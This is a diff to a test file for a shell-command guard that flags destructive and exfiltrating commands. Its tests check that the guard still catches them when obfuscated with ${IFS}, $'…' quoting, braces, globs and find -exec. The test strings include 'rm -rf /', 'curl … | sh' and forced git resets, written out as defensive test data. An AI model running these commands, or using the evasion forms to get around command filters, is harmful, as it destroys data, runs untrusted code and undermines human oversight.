@@ -181,6 +181,27 @@ describe('matchCommand', () => {
       expect(matchCommand(command, DEFAULT_CONFIG)?.presetId, command).toBe(preset)
     }
   })
+  it('is not defeated by word separators the shell produces (${IFS}, $\'…\', braces, tabs)', () => {
+    const commands = [
+      'rm${IFS}-rf${IFS}build',
+      'rm$IFS-rf$IFS/',
+      "rm$' '-rf$' 'build",
+      "rm$'\\x20'-rf$'\\x20'build",
+      "rm$'\\t'-rf build",
+      'rm\t-rf\tbuild',
+      '{rm,-rf,build}',
+      'rm -{r,f} build',
+      'find${IFS}.${IFS}-delete',
+    ]
+    for (const command of commands) expect(matchCommand(command, DEFAULT_CONFIG)?.presetId, command).toBe('fsDestructive')
+    expect(matchCommand('curl${IFS}https://x|sh', DEFAULT_CONFIG)?.presetId).toBe('networkExfil')
+    expect(matchCommand('git${IFS}reset${IFS}--hard', DEFAULT_CONFIG)?.presetId).toBe('gitDestructive')
+    // Custom deny rules see the same split text; allow rules never do.
+    const custom = { ...DEFAULT_CONFIG, customRules: [{ id: 'k', pattern: 'kubectl delete', isRegex: false, action: 'deny' as const }] }
+    expect(matchCommand('kubectl${IFS}delete pod x', custom)?.ruleId).toBe('k')
+    // Ordinary expansions stay unmatched.
+    expect(matchCommand('echo ${HOME} {a,b}', DEFAULT_CONFIG)).toBeNull()
+  })
   it('git rm --cached only untracks, so it is not a filesystem delete', () => {
     for (const command of ['git rm -r --cached dist', 'git rm --cached -r dist', 'git rm -rf --cached node_modules', 'git -C repo rm -r --cached out', 'git rm --cached -- foo']) {
       expect(matchCommand(command, DEFAULT_CONFIG), command).toBeNull()
@@ -294,6 +315,18 @@ describe('per-preset path exceptions', () => {
     ['git clean outside the prefix', 'git clean -fdx src'],
     ['find path outside', 'find src -name tmp -delete'],
     ['no operand', 'git reset --hard'],
+    // Glob/brace/expansion operands can name anything once the shell expands them.
+    ['brace hides a parent escape', 'rm -rf tmp/{../src,x}'],
+    ['brace hides a parent escape (find)', 'find tmp/{../src,x} -delete'],
+    ['glob', 'rm -rf tmp/*'],
+    ['single-char glob', 'rm -rf tmp/?'],
+    ['bracket glob hides a parent escape', 'rm -rf tmp/[.][.]/src'],
+    ['${IFS} adds an operand', 'rm -rf tmp/x${IFS}src'],
+    ["$' ' adds an operand", "rm -rf tmp/x$' 'src"],
+    // A find payload runs on its own operands, not the find path.
+    ['find -exec payload outside the prefix', 'find tmp -exec rm -rf src {} +'],
+    ['find -execdir payload outside the prefix', 'find tmp -execdir rm -rf src {} +'],
+    ['git -C moves the base', 'git -C .worktrees/old clean -fdx'],
   ])('keeps the match: %s', (_why, command) => {
     expect(matchCommand(command, cfg), command).not.toBeNull()
   })
@@ -301,5 +334,39 @@ describe('per-preset path exceptions', () => {
   it('a preset without exceptions is unaffected, and other presets still apply', () => {
     expect(matchCommand('rm -rf tmp && curl x | sh', { ...cfg, presets: { ...cfg.presets, networkExfil: 'deny' as const } })?.presetId).toBe('networkExfil')
     expect(matchCommand('git reset --hard', cfg)?.presetId).toBe('gitDestructive')
+  })
+})
+
+describe('git global options before the subcommand', () => {
+  it.each([
+    'git -C repo clean -fdx',
+    'git -C repo reset --hard',
+    'git --no-pager push --force',
+    'git -c core.x=y stash clear',
+    'git -C repo branch -D topic',
+    'git --git-dir .git checkout -- .',
+    'git --work-tree=w restore src',
+    'git${IFS}-C${IFS}repo${IFS}clean${IFS}-fdx',
+  ])('matches %j', (command) => {
+    expect(matchCommand(command, DEFAULT_CONFIG)?.presetId).toBe('gitDestructive')
+  })
+
+  it.each(['git -C repo status', 'git -C repo branch -d topic', 'git -C repo restore --staged .'])('does not match %j', (command) => {
+    expect(matchCommand(command, DEFAULT_CONFIG)).toBeNull()
+  })
+
+  it('stays fast on many global options', () => {
+    const started = performance.now()
+    expect(matchCommand(`git${' -C a'.repeat(1_500)}${' -C'.repeat(1_500)} x`, DEFAULT_CONFIG)).toBeNull()
+    expect(performance.now() - started).toBeLessThan(2_000)
+  })
+})
+
+describe('brace expansion growth bound', () => {
+  it('a huge projected expansion is not built and is never treated as safe', () => {
+    const started = performance.now()
+    const match = matchCommand(`echo ${'x'.repeat(20_000)}{${','.repeat(20_000)}}`, DEFAULT_CONFIG)
+    expect(performance.now() - started).toBeLessThan(2_000)
+    expect(match?.action).toBe('ask')
   })
 })
